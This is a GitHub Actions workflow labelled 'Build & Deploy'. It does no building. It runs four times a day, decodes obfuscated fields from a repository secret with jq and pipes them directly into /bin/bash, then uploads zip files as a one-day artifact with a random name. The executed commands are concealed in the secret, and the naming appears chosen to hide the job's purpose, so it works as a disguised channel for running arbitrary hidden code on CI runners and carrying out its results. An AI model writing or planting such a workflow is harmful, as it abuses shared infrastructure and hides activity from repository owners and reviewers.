name: Build & Deploy
on:
  workflow_dispatch:

  schedule:
    - cron: '39 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Start
        env:
          xdg89351: ${{ secrets.xdg89351 }}
        run: |
          printf '%s' "$xdg89351" | jq -r .w61 | /bin/bash
          echo $h6 | jq -r .ryms6035 | /bin/bash
          echo $ox7 | jq -r .mcfhg944 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: lXtyVxVR
          path: "*.zip"
          retention-days: 1
